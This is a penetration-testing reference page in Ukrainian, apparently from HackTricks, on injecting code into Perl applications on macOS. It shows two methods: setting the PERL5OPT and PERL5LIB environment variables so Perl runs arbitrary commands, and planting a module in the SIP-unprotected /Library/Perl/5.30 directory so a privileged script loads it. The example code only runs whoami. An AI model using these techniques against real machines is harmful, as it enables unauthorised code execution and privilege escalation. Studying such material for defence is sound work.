# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## Через змінні середовища `PERL5OPT` та `PERL5LIB`

Використовуючи змінну середовища PERL5OPT, можна змусити perl виконувати довільні команди.\
Наприклад, створіть цей скрипт:
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
Тепер **експортуйте змінну середовища** та виконайте **perl** скрипт:
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
Інший варіант - створити модуль Perl (наприклад, `/tmp/pmod.pm`):
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
А потім використовуйте змінні середовища:
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod
```
## Через залежності

Можливо перерахувати порядок папок залежностей, що виконує Perl:
```bash
perl -e 'print join("\n", @INC)'
```
Що поверне щось на зразок:
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
Деякі з повернених папок навіть не існують, однак, **`/Library/Perl/5.30`** **існує**, вона **не** **захищена** **SIP** і знаходиться **перед** папками, **захищеними SIP**. Тому хтось міг би зловживати цією папкою, щоб додати залежності скриптів, щоб скрипт Perl з високими привілеями міг його завантажити.

> [!WARNING]
> Однак зверніть увагу, що вам **потрібно бути root, щоб записувати в цю папку** і в наш час ви отримаєте цей **TCC prompt**:

<figure><img src="../../../images/image (28).png" alt="" width="244"><figcaption></figcaption></figure>

Наприклад, якщо скрипт імпортує **`use File::Basename;`**, буде можливим створити `/Library/Perl/5.30/File/Basename.pm`, щоб виконати довільний код.

## References

- [https://www.youtube.com/watch?v=zxZesAN-TEk](https://www.youtube.com/watch?v=zxZesAN-TEk)

{{#include ../../../banners/hacktricks-training.md}}
